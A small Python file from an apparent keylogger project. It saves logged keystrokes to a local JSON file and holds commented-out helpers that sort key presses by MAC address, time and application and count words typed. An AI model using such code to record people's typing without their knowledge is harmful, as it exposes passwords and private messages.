import json

class FileWriter:
    @staticmethod
    def write_to_file(data:dict):
        print("aaaq")
        if data :
            with open(r"C:\Users\1\projet keylogger kodkode\keys.json" , "w" , encoding="utf-8") as file:
                json.dump(data , file ,ensure_ascii=False , indent=4)

#         #     for
# #         # print("3 secends")
# def count_occurrences_of_word(word, key_presses):
#     # המרת המילה לרשימה של תווים
#     word_list = list(word)
#
#     # משתנה לספירת התוצאות
#     count = 0
#
#     # עוברים על רשימת ההקשות
#     for i in range(len(key_presses) - len(word_list) + 1):
#         # בודקים אם יש רצף של הקשות התואם למילה
#         if key_presses[i:i + len(word_list)] == word_list:
#             count += 1
#
#     return count
# def get_key_presses(data):
#     key_presses = []
#
#     # עובר על כל כתובת MAC במילון
#     for mac_address, date_info in data.items():
#         # עובר על כל תאריך ושעה
#         for date_time, app_info in date_info.items():
#             # עובר על כל אפליקציה
#             for app, keys in app_info.items():
#                 # עובר על כל רשימת ההקשות ומוסיף את ההקשות
#                 for key, key_presses_list in keys.items():
#                     key_presses.extend(key_presses_list)
#
#     return key_presses
#
# data = ["e","fr","Rfw","a","a","b","a","a","b","rws"]
# print(count_occurrences_of_word("aa" , data))